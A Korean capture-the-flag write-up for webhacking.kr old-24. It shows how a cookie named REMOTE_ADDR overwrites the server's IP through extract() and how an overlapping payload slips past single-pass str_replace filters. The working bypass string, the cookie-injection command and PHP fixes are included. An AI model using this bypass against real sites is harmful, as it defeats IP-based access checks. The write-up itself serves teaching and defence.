[webhacking.kr](https://webhacking.kr)의 **old-24** 문제를 풀었다.
접속자의 IP가 `127.0.0.1`일 때만 통과하는 문제인데, 핵심은 두 가지다.
**서버가 클라이언트가 보낸 값을 그대로 IP로 믿는다**는 점(`extract()`로 쿠키가 서버 변수를 덮어씀),
그리고 그 값을 거르는 **`str_replace` 블랙리스트가 "한 번만 훑는다"(단일 패스)** 는 점이다.

"쿠키로 IP 위조"에서 멈추지 않고, **4단계 필터가 내 입력을 어떻게 깎아내는지**
를 한 글자씩 따라가며 왜 길이 20짜리 입력이 정확히 `127.0.0.1`로 변하는지 정리한다.
아래 내용은 전부 **실제로 서버에 넣어 통과를 확인한 것**이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-24 (`/challenge/bonus-4/`) |
| 유형 | 클라이언트 신뢰 / 블랙리스트 필터 우회 |
| 목표 | `client ip`가 **`127.0.0.1`** 로 판정되어 통과 |

문제 페이지는 접속자의 `client ip`와 `agent`를 표로 보여준다.
처음 들어가면 내 실제 IP가 찍히고 **`Wrong IP!`** 가 뜬다.
IP가 `127.0.0.1`(로컬호스트)이면 풀린다.

```
client ip    14.41.76.65
agent        Mozilla/5.0 ...
Wrong IP!
```

## 3. 문제점 — 어디가 취약한가

### 3-1. `extract($_COOKIE)` — 쿠키가 서버 변수를 덮어쓴다

`extract()`는 배열의 키를 **같은 이름의 지역 변수로 풀어준다.**
여기서는 순서가 결정적이다.

```php
extract($_SERVER);   // $REMOTE_ADDR = 진짜 접속 IP
extract($_COOKIE);   // 쿠키 키로 같은 변수를 '다시' 덮어씀
$ip = $REMOTE_ADDR;  // 그래서 쿠키가 이긴다
```

`$_SERVER['REMOTE_ADDR']`로 설정된 **진짜 IP가 먼저 들어오지만**,
바로 다음 줄에서 `$_COOKIE`를 풀면서 **같은 이름의 쿠키가 있으면 그 값으로 덮어쓴다.**
즉 `REMOTE_ADDR`라는 이름의 **쿠키 하나로 서버가 보는 IP를 내가 정할 수 있다.**
서버가 "접속 IP"라고 믿는 값이 사실은 **클라이언트가 보낸 값**이 되는 것이다.

> 그냥 `$ip=$REMOTE_ADDR`로 끝났다면 쿠키 `REMOTE_ADDR=127.0.0.1`만 넣으면 끝이다.
> 하지만 문제는 그 뒤에 **필터 4줄**을 붙여 그걸 막으려 한다.

### 3-2. `str_replace` 블랙리스트 — 단일 패스라는 틈

```php
$ip = str_replace("..",".",$ip);   // (A) 점 두 개를 하나로
$ip = str_replace("12","",$ip);    // (B) "12" 제거
$ip = str_replace("7.","",$ip);    // (C) "7." 제거
$ip = str_replace("0.","",$ip);    // (D) "0." 제거
```

`127.0.0.1`을 그대로 넣으면 이 필터가 **스스로 다 지워버린다.**
`127.0.0.1`은 `12`, `7.`, `0.`, `0.`를 **전부 포함**하기 때문이다.
정상 IP를 넣는 방식으로는 통과 문자열을 만들 수 없다.

여기서 핵심은 `str_replace`가 **문자열을 한 번만 왼쪽에서 오른쪽으로 훑고,
치환으로 새로 생긴 패턴은 다시 검사하지 않는다**는 점이다(단일 패스).
그래서 **패턴을 "겹쳐" 넣으면 한 겹만 지워지고 한 겹이 살아남는다.**

- `1122` → `12` 제거 → 가운데 `12`만 사라지고 바깥 `1`,`2`가 붙어 → **`12`**
- `77..` → `7.` 제거 → 앞 `7.`만 사라지고 → **`7.`**
- `00..` → `0.` 제거 → 앞 `0.`만 사라지고 → **`0.`**

문제는 위 트릭에 **`..`(점 두 개)가 필요**한데, (A)가 `..`를 `.`로 줄여버린다는 것이다.
그런데 (A) 역시 단일 패스다. **점 세 개 `...`를 넣으면** `..`를 **한 번만** `.`로 바꿔
`.` + `.` = **`..`가 그대로 남는다.** 이 `..`가 (C)·(D)의 재료가 된다.

## 4. 익스플로잇 — 페이로드 설계와 검증

필요한 결과는 `127.0.0.1` = `12` + `7.` + `0.` + `0.` + `1`.
각 조각을 위 트릭으로 "겹쳐" 만들면 된다.

| 결과 조각 | 넣을 입력 | 담당 필터 |
| --- | --- | --- |
| `12` | `1122` | (B) `12` 제거 |
| `7.` | `77..` | (C) `7.` 제거 |
| `0.` | `00..` | (D) `0.` 제거 |
| `0.` | `00..` | (D) `0.` 제거 |
| `1` | `1` | — |

그리고 `7..`·`00..`에 쓰일 `..`는 모두 **`...`(세 점)** 로 넣어 (A)를 버티게 한다.
이어 붙이면 최종 페이로드는 다음과 같다(길이 20).

```
112277...00...00...1
```

필터가 이 입력을 어떻게 깎아내는지 **한 단계씩 직접 돌려** 확인했다.

```text
raw           : 112277...00...00...1   (len 20)
(A) ".."→"."  : 112277..00..00..1
(B) rm "12"   : 1277..00..00..1
(C) rm "7."   : 127.00..00..1
(D) rm "0."   : 127.0.0.1          ✓
```

- **(A)**: 세 점 `...`가 각각 `..`로 줄어든다(완전히 `.` 하나가 되지 않는다).
- **(B)**: `1122`의 안쪽 `12`만 지워져 `12`가 남는다.
- **(C)**: `77..` 에서 `7.` 한 번만 지워져 **`7.`** 가 생긴다.
- **(D)**: `00..` 두 덩어리에서 각각 `0.` 한 번씩 지워져 **`0.` `0.`** 가 생긴다.

결과가 정확히 `127.0.0.1`이다.

### 실제 전송 — 쿠키로 주입

브라우저 콘솔에서 `REMOTE_ADDR` 쿠키를 심고 문제 페이지를 새로고침했다.

```js
document.cookie = "REMOTE_ADDR=112277...00...00...1; path=/";
```

```console
GET /challenge/bonus-4/   (Cookie: REMOTE_ADDR=112277...00...00...1)
→ client ip    127.0.0.1
→ old-24 Pwned. You got 10point. Congratz!
```

## 5. 결과

서버가 보는 `client ip`가 `127.0.0.1`로 판정되어 `solve(24)`가 호출되고 통과했다.

```
client ip    127.0.0.1
agent        Mozilla/5.0 ...
old-24 Pwned. You got 10point. Congratz!
```

> 이 문제도 **따로 제출할 플래그가 없다.** 조건(`$ip=="127.0.0.1"`)을 만족시키는
> 입력을 만들어 넣는 순간 서버가 바로 통과 처리한다.

## 6. 왜 취약한가 — 그리고 올바른 방어

이 문제는 서로 다른 두 실수가 겹쳐 있다.

**(1) 클라이언트가 보낸 값을 신원·권한의 근거로 썼다.**
`extract($_COOKIE)`로 `REMOTE_ADDR`을 덮어쓸 수 있는 순간,
"접속 IP"는 더 이상 서버가 아는 사실이 아니라 **공격자가 고르는 값**이다.
`extract()`를 신뢰할 수 없는 입력(`$_GET`/`$_POST`/`$_COOKIE`)에 쓰는 것
자체가 위험하다 — 어떤 지역 변수든 외부에서 덮어쓸 수 있게 된다.

```php
// 나쁨: 쿠키/파라미터가 임의 변수를 덮어쓴다
extract($_COOKIE);

// 좋음: 필요한 값만 명시적으로, 신뢰 가능한 출처에서 읽는다
$ip = $_SERVER['REMOTE_ADDR'];   // 쿠키로 덮이지 않음
```

**(2) 블랙리스트 필터로 "값 세탁"을 시도했다.**
`str_replace`로 특정 문자열을 지우는 방식은 방어가 아니다.
특히 **단일 패스**라서 패턴을 겹쳐 넣으면 한 겹이 살아남고,
치환이 새 패턴을 만들어내는 틈까지 생긴다.
IP 같은 값은 **지우지 말고 검증·거부**해야 한다.

```php
// 값을 깎아 맞추려 하지 말고, 형식에 맞는지 확인하고 아니면 거부
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false) {
  exit("invalid ip");
}
```

## 7. 정리

- `extract()`를 **신뢰할 수 없는 입력**에 쓰면 임의 변수가 덮어써진다 — 여기서는 쿠키 하나로 "접속 IP"가 위조됐다.
- 서버가 판단의 근거로 쓰는 값이 **클라이언트에서 온 것**은 아닌지 먼저 물어야 한다.
- **블랙리스트 치환은 방어가 아니다** — 특히 `str_replace`는 **단일 패스**라 `1122`·`77..`·`00..`처럼 패턴을 겹치면 한 겹이 남고, `...`처럼 **필터가 미처 다 줄이지 못하는 입력**이 재료가 된다.
- 값을 **깎아서 통과시키지 말고, 형식을 검증하고 어긋나면 거부**하는 것이 올바른 방향이다.

> "이 입력을 어떻게 지울까"가 아니라 "이 값이 올바른 형식인가, 그리고 그 출처를 믿을 수 있는가"를 먼저 묻는다.
